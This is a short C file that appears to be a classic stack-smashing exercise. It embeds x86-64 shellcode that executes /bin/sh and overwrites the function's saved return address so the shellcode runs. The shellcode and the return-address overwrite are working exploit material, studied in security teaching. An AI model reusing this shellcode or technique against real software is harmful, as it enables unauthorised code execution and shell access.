void function(int a, int b, int c) {
   	char shellcode[] =
		"\xeb\x24\x5e\x48\x31\xc0\x48\x89\x46\x08\x88\x46\x07\x48\x89\xf7"
		"\x48\x8d\x76\x08\x48\x8d\x56\x08\xb0\x3b\x0f\x05\x48\x31\xc0\xb0"
		"\x3c\x48\x31\xff\x0f\x05\xe8\xd7\xff\xff\xff\x2f\x62\x69\x6e\x2f"
		"\x73\x68\x30\x30\x30\x30\x30\x30\x30\x30\x30";

	long long *ret;
	ret = shellcode + 88;
	(*ret) = (long long) shellcode;
}

void main() {
   function(1,2,3);

}
